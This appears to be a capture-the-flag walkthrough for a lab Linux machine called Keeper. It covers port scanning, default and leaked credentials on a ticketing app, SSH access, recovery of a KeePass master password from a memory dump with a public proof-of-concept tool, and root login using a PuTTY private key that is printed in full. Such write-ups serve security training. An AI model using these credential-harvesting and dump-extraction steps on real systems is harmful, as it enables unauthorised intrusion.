System: Linux
Difficulty: Easy

IP Address: 10.129.229.41

# User Flag

NMAP Ports are enumerated.
```
sudo nmap 10.129.229.41 -sC -sV
```

Here are the results.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add this line into the `/etc/hosts` file.
```
10.129.229.41	keeper.htb tickets.keeper.htb
```

After being redirected to the `ticker.keeper.htb/rt/`, it is possible to see a login form.  
![[keeper_1.png]]

The default credentials for this web application is `root:password`.
After checking the users section, it is possible to see a user alongside root with a potential password.
![[keeper_2.png]]

The credentials `lnorgaard:Welcome2023!` worked successfully on SSH.

```
kali@kali:~$ ssh lnorgaard@keeper.htb
```

The user flag contents are in below.
```
3f634ef3f7981984923c62e0acd5e063
```

# Root Flag

A file named `RT30000.zip` is suspicious. It is now downloaded on the system.
```
scp lnorgaard@keeper.htb:~/RT30000.zip .
```

2 Files are found after extracting, `passcodes.kdbx` and `KeePassDumpFull.dmp`.

The KDBX File is examined, but the password is missing.
```
kpcli --kdb passcodes.kdbx
Provide the master password:
```

A Keepass Password Extraction Exploit is downloaded from GitHub.
```
git clone https://github.com/matro7sh/keepass-dump-masterkey.git
```

The exploit is executed with the dump file.
```
python poc.py ~/dump/KeePassDumpFull.dmp
```

```
Possible password: ●_dgr●d med fl●de
```

The possible password is `Rødgrød med fløde`, based on Google Search.

After putting this password into the `pass.txt`, the database can be accessed.
This is because of special characters in the string that may cause errors on terminal prompts.
```
kpcli --kdb=passcodes.kdbx --pwfile=pass.txt
```

The root password is shown after querying with this command.
The other entries does not look interesting.
```
find .
show 0 -f
```

While the password did not worked with SSH, this PUTTY Key that came along can be exploited.
```
PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

After saving the key into `key.ppk`, the key is converted to id_rsa through those commands.
```
puttygen key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
```

Login as root is atttempted.
```
ssh root@keeper.htb -i id_rsa
```

The root flag contents is in below.
````
819d153a86a5b82f132d084706b710c1
```